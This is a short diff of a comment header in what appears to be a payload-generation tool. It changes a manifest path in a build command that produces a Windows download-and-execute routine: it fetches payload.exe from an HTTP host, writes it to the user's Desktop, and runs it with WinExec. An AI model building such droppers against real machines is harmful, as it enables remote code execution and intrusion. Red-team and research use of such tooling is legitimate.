@@ -2,7 +2,7 @@
 # IR workflow: GetUserNameA -> build path -> WinInet download -> write -> WinExec
 #
 # Build:
-#   uv run emitrion emitrion/manifests/http_download_to_userdir.yaml \
+#   uv run emitrion emitrion/manifests/win-x86/http_download_to_userdir.yaml \
 #       --url "http://192.168.1.10/payload.exe" \
 #       --path-prefix "C:\Users\\" \
 #       --path-suffix "\Desktop\payload.exe" \
